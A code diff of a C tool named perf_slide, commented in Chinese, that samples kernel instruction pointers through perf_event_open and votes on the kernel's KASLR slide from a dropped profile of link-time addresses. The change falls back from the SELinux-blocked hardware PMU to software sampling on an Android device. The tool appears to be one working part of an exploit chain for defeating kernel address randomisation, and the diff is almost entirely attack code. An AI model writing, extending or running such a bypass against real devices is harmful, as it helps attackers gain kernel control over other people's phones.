@@ -1,16 +1,19 @@
 /*
- * perf_slide — 用硬件 PMU 采样泄漏的内核帧反推 KASLR 位移。
+ * perf_slide — 用 perf 采样泄漏的内核帧反推 KASLR 位移。
  *
- * 按原件字符串表重建（CI Artifact 的 strings/perf_slide.orig.txt）。原件行为
- * 从输出串就能还原：
- *   [perf] samples=%d kernel_frames=%d / candidates=%d / best votes=%d/%d slide=%#lx
- *   [perf] no kernel frames leaked / no slide candidate / no usable hardware PMU errno=%d
- *   [perf] hardware cycles open failed errno=%d (%s) / mmap failed errno=%d
- *   slide=0x%llx / site=0x%llx
- * 配置串：--period --stext --etext --timer --duration，以及内核符号表版本标记
- * LINUX_2.6.39。
+ * 真机结论（2026-11-22，shell 身份，6.18.21）：
+ *   perf_event_open(HARDWARE cycles)  → errno=13 EACCES   SELinux 只挡硬件 PMU
+ *   perf_event_open(SOFTWARE)         → errno=7  E2BIG    权限通，只是 attr.size 太大
+ * 所以这里：attr.size 用 PERF_ATTR_SIZE_VER5，先试硬件，失败退回软件采样。
  *
- * 判定规则与 Java 侧 KernelSupport.isSlideValid 一致：slide 必须 2MB 对齐。
+ * slide 的求法：
+ *   内核镜像按 2MB 对齐加载，即 运行时地址 = 链接期地址 + slide，且 slide & 0x1FFFFF == 0。
+ *   于是对任意泄漏到的内核 ip：若某个 profile 链接期地址 P 满足
+ *   (P & 0x1FFFFF) == (ip & 0x1FFFFF)，则 slide = ip - P。
+ *   每个样本给出一票，多样本投票取多数——单个样本会有假匹配，多数投票能收敛。
+ *
+ * profile 来自 /data/local/tmp/lhasa_profile.txt（App 会先投放），
+ * 也可以用 --profile 指定别的路径。
  */
 #define _GNU_SOURCE 1
 #include <errno.h>
@@ -26,17 +29,18 @@
 #include <linux/perf_event.h>
 
 #define MAX_CANDIDATES 4096
-#define SAMPLE_LIMIT   200000
+#define SAMPLE_LIMIT   400000
+#define MAX_PROFILE    64
+#define SLIDE_MASK     0x1FFFFFULL
 
 static const char *KERNEL_SYMBOL_VERSION = "LINUX_2.6.39";
+static const char *DEFAULT_PROFILE = "/data/local/tmp/lhasa_profile.txt";
 
 struct config {
 	uint64_t period;
-	uint64_t stext;
-	uint64_t etext;
-	uint64_t timer;
 	uint64_t duration_ms;
 	int quiet;
+	const char *profile;
 };
 
 struct candidate {
@@ -46,6 +50,45 @@ struct candidate {
 
 static struct candidate g_candidates[MAX_CANDIDATES];
 static int g_candidate_count;
+static uint64_t g_profile[MAX_PROFILE];
+static int g_profile_count;
+
+static int is_kernel_address(uint64_t ip)
+{
+	return (ip >> 48) == 0xffff;
+}
+
+static int is_valid_slide(uint64_t slide)
+{
+	return (slide & SLIDE_MASK) == 0
+		&& ((slide + (uint64_t)(-272730423296LL)) >> 48) == 0xFFFF;
+}
+
+/* 从 profile 里收集所有 0x… 形式的链接期地址。 */
+static void load_profile(const char *path)
+{
+	FILE *file = fopen(path, "r");
+	if (!file)
+		return;
+	char line[4096];
+	while (fgets(line, sizeof(line), file) != NULL) {
+		if (strncmp(line, "release=", 8) != 0)
+			continue;
+		char *cursor = line;
+		while ((cursor = strstr(cursor, "0x")) != NULL) {
+			char *end = NULL;
+			unsigned long long value = strtoull(cursor, &end, 16);
+			if (end == cursor) {
+				cursor += 2;
+				continue;
+			}
+			if (g_profile_count < MAX_PROFILE && is_kernel_address(value))
+				g_profile[g_profile_count++] = value;
+			cursor = end;
+		}
+	}
+	fclose(file);
+}
 
 static void vote(uint64_t slide)
 {
@@ -62,22 +105,22 @@ static void vote(uint64_t slide)
 	}
 }
 
-static int is_kernel_address(uint64_t ip)
+/* 用低 21 位匹配 profile 地址；命中则给出 slide 候选。 */
+static void consider_ip(uint64_t ip)
 {
-	return (ip >> 48) == 0xffff;
-}
-
-/* 与 KernelSupport.isSlideValid 同一条规则：2MB 对齐且落在内核区间。 */
-static int is_valid_slide(uint64_t slide)
-{
-	return (slide & 0x1FFFFFULL) == 0
-		&& ((slide + (uint64_t)(-272730423296LL)) >> 48) == 0xFFFF;
+	uint64_t low = ip & SLIDE_MASK;
+	for (int i = 0; i < g_profile_count; i++) {
+		if ((g_profile[i] & SLIDE_MASK) != low)
+			continue;
+		uint64_t slide = ip - g_profile[i];
+		if (is_valid_slide(slide))
+			vote(slide);
+	}
 }
 
 static void usage(const char *argv0)
 {
-	printf("usage: %s [--period n] [--stext 0x..] [--etext 0x..] [--timer 0x..] "
-	       "[--duration ms]\n", argv0);
+	printf("usage: %s [--period n] [--duration ms] [--profile path] [--quiet]\n", argv0);
 }
 
 static void parse_args(int argc, char **argv, struct config *cfg)
@@ -86,69 +129,53 @@ static void parse_args(int argc, char **argv, struct config *cfg)
 		const char *arg = argv[i];
 		if (!strcmp(arg, "--period") && i + 1 < argc)
 			cfg->period = strtoull(argv[++i], NULL, 0);
-		else if (!strcmp(arg, "--stext") && i + 1 < argc)
-			cfg->stext = strtoull(argv[++i], NULL, 0);
-		else if (!strcmp(arg, "--etext") && i + 1 < argc)
-			cfg->etext = strtoull(argv[++i], NULL, 0);
-		else if (!strcmp(arg, "--timer") && i + 1 < argc)
-			cfg->timer = strtoull(argv[++i], NULL, 0);
 		else if (!strcmp(arg, "--duration") && i + 1 < argc)
 			cfg->duration_ms = strtoull(argv[++i], NULL, 0);
+		else if (!strcmp(arg, "--profile") && i + 1 < argc)
+			cfg->profile = argv[++i];
 		else if (!strcmp(arg, "--quiet"))
 			cfg->quiet = 1;
+		else if (!strcmp(arg, "-h") || !strcmp(arg, "--help"))
+			usage(argv[0]);
 	}
 	if (cfg->duration_ms == 0)
-		cfg->duration_ms = 300;
+		cfg->duration_ms = 400;
+	if (cfg->period == 0)
+		cfg->period = 1000;
 }
 
-int main(int argc, char **argv)
+/* 采样一段时间，返回样本数；成功返回 0。 */
+static int sample(uint32_t type, uint64_t config, struct config *cfg,
+                  int *samples_out, int *kernel_frames_out)
 {
-	struct config cfg = {
-		.period = 1000,
-		.stext = 0,
-		.etext = 0,
-		.timer = 0,
-		.duration_ms = 0,
-		.quiet = 0,
-	};
-	parse_args(argc, argv, &cfg);
-
-	if (!cfg.stext || !cfg.etext) {
-		printf("提示：采样窗口未指定（--stext/--etext），只统计内核帧；"
-		       "符号表版本标记 %s。\n", KERNEL_SYMBOL_VERSION);
-	}
-
 	struct perf_event_attr attr;
 	memset(&attr, 0, sizeof(attr));
-	attr.type = PERF_TYPE_HARDWARE;
-	attr.size = sizeof(attr);
-	attr.config = PERF_COUNT_HW_CPU_CYCLES;
-	attr.sample_period = cfg.period;
+	attr.type = type;
+	attr.size = PERF_ATTR_SIZE_VER5;
+	attr.config = config;
+	attr.sample_period = cfg->period;
 	attr.sample_type = PERF_SAMPLE_IP;
 	attr.disabled = 1;
 	attr.exclude_user = 1;
 	attr.wakeup_events = 1;
 
 	int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
-	if (fd < 0) {
-		printf("[perf] hardware cycles open failed errno=%d (%s)\n", errno, strerror(errno));
-		printf("[perf] no usable hardware PMU errno=%d\n", errno);
-		return 1;
-	}
+	if (fd < 0)
+		return -errno;
 
 	size_t page = (size_t)sysconf(_SC_PAGESIZE);
 	size_t data_pages = 64;
 	size_t map_len = (data_pages + 1) * page;
 	void *ring = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	if (ring == MAP_FAILED) {
-		printf("[perf] mmap failed errno=%d\n", errno);
+		int err = -errno;
 		close(fd);
-		return 1;
+		return err;
 	}
 
 	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
 	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-	usleep((useconds_t)(cfg.duration_ms * 1000));
+	usleep((useconds_t)(cfg->duration_ms * 1000));
 	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
 	struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)ring;
@@ -159,29 +186,20 @@ int main(int argc, char **argv)
 	__sync_synchronize();
 	uint64_t tail = meta->data_tail;
 
-	int samples = 0, kernel_frames = 0;
-	uint64_t site = 0;
-
+	int samples = 0;
+	int kernel_frames = 0;
 	while (tail < head && samples < SAMPLE_LIMIT) {
 		struct perf_event_header *header =
 			(struct perf_event_header *)(data + (tail % data_size));
-
 		if (header->size < sizeof(*header) || tail + header->size > head)
 			break;
-
 		if (header->type == PERF_RECORD_SAMPLE) {
 			uint64_t ip;
 			memcpy(&ip, data + (tail % data_size) + sizeof(*header), sizeof(ip));
 			samples++;
 			if (is_kernel_address(ip)) {
 				kernel_frames++;
-				if (!site)
-					site = ip;
-				if (cfg.stext && ip >= cfg.stext && (cfg.etext == 0 || ip <= cfg.etext)) {
-					uint64_t slide = (ip - cfg.stext) & ~0x1FFFFFULL;
-					if (is_valid_slide(slide))
-						vote(slide);
-				}
+				consider_ip(ip);
 			}
 		}
 		tail += header->size;
@@ -191,15 +209,54 @@ int main(int argc, char **argv)
 	munmap(ring, map_len);
 	close(fd);
 
+	*samples_out = samples;
+	*kernel_frames_out = kernel_frames;
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	struct config cfg = {
+		.period = 0,
+		.duration_ms = 0,
+		.quiet = 0,
+		.profile = DEFAULT_PROFILE,
+	};
+	parse_args(argc, argv, &cfg);
+
+	load_profile(cfg.profile);
+	if (g_profile_count == 0) {
+		printf("[perf] profile 不可用（%s），无法把 ip 折算成 slide\n", cfg.profile);
+		printf("提示：符号表版本标记 %s\n", KERNEL_SYMBOL_VERSION);
+		return 1;
+	}
+
+	int samples = 0, kernel_frames = 0;
+	int hw_err = sample(PERF_TYPE_HARDWARE, PERF_COUNT_HW_CPU_CYCLES, &cfg,
+	                    &samples, &kernel_frames);
+	if (hw_err == 0) {
+		printf("[perf] 采样方式：hardware cycles\n");
+	} else {
+		printf("[perf] hardware cycles open failed errno=%d (%s)\n",
+		       -hw_err, strerror(-hw_err));
+		/* 软件事件在 shell 身份下是允许的（硬件 PMU 被 SELinux 挡），换它对采样 */
+		int sw_err = sample(PERF_TYPE_SOFTWARE, PERF_COUNT_SW_CPU_CLOCK, &cfg,
+		                    &samples, &kernel_frames);
+		if (sw_err != 0) {
+			printf("[perf] no usable hardware PMU errno=%d\n", -sw_err);
+			printf("[perf] software sampling also failed errno=%d (%s)\n",
+			       -sw_err, strerror(-sw_err));
+			return 1;
+		}
+		printf("[perf] 采样方式：software cpu-clock\n");
+	}
+
 	printf("[perf] samples=%d kernel_frames=%d\n", samples, kernel_frames);
 
 	if (kernel_frames == 0) {
 		printf("[perf] no kernel frames leaked\n");
 		return 1;
 	}
-
-	if (site)
-		printf("site=0x%llx\n", (unsigned long long)site);
 
 	if (g_candidate_count == 0) {
 		printf("[perf] no slide candidate\n");
